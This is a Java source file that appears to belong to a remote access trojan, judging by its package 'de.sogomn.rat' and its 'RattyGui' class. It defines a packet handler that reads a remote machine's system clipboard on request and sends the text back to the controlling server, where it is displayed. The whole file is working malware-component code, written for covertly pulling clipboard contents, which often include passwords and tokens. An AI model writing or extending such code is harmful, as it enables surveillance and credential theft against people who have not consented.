package de.sogomn.rat.packet;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.server.gui.RattyGui;

public final class ClipboardPacket extends AbstractPingPongPacket {
	
	private String clipboardContent;
	
	public ClipboardPacket() {
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		client.writeUTF(clipboardContent);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		clipboardContent = client.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		type = DATA;
		
		try {
			final Object clipboardObject = Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
			
			if (clipboardObject != null) {
				clipboardContent = (String)clipboardObject;
			}
		} catch (final HeadlessException | UnsupportedFlavorException | IOException ex) {
			clipboardContent = "";
		}
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		RattyGui.showMessage(clipboardContent);
	}
	
}
